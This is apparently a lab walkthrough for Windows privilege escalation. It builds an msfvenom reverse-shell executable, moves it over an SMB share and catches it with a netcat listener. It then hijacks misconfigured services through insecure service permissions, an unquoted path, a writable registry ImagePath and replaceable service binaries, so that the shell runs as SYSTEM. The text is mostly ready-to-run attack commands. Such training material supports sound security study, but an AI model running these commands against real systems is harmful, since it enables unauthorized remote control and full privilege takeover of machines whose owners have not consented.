# Windows Privesc

### Connecting with RDP Port 3389

```text
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.34.38
```

### Making SMB Server to send Rev-shell

Generate a reverse shell executable \(reverse.exe\) using msfvenom.

```text
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

Transfer the reverse.exe file to the C:\PrivEsc directory on Windows. There are many ways you could do this, however the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file.

On Kali, in the same directory as reverse.exe:

`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`

On Windows \(update the IP address with your Kali IP\):

`copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe`

Test the reverse shell by setting up a netcat listener on Kali:

`sudo nc -nvlp 53`

Then run the reverse.exe executable on Windows and catch the shell:

`C:\PrivEsc\reverse.exe`

![](.gitbook/assets/image%20%2840%29.png)

### Service Exploits - Insecure Service Permissions

Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:

`C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`

![](.gitbook/assets/image%20%2841%29.png)

Note that the "user" account has the permission to change the service config \(SERVICE\_CHANGE\_CONFIG\).

Query the service and note that it runs with SYSTEM privileges \(SERVICE\_START\_NAME\):

`sc qc daclsvc`

![](.gitbook/assets/image%20%2842%29.png)

Modify the service config and set the BINARY\_PATH\_NAME \(binpath\) to the reverse.exe executable you created:

`sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start daclsvc`

### Service Exploits - Unquoted Service Path

Query the "unquotedsvc" service and note that it runs with SYSTEM privileges \(SERVICE\_START\_NAME\) and that the BINARY\_PATH\_NAME is unquoted and contains spaces.

`sc qc unquotedsvc`

Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:

`C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`

Copy the reverse.exe executable you created to this directory and rename it Common.exe:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start unquotedsvc`

### Service Exploits - Weak Registry Permissions

Query the "regsvc" service and note that it runs with SYSTEM privileges \(SERVICE\_START\_NAME\).

`sc qc regsvc`

Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group \(essentially all logged-on users\):

`C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`

Overwrite the ImagePath registry key to point to the reverse.exe executable you created:

`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start regsvc`

### Service Exploits - Insecure Service Executables

Query the "filepermsvc" service and note that it runs with SYSTEM privileges \(SERVICE\_START\_NAME\).

`sc qc filepermsvc`

Using accesschk.exe, note that the service binary \(BINARY\_PATH\_NAME\) file is writable by everyone:

`C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start filepermsvc`



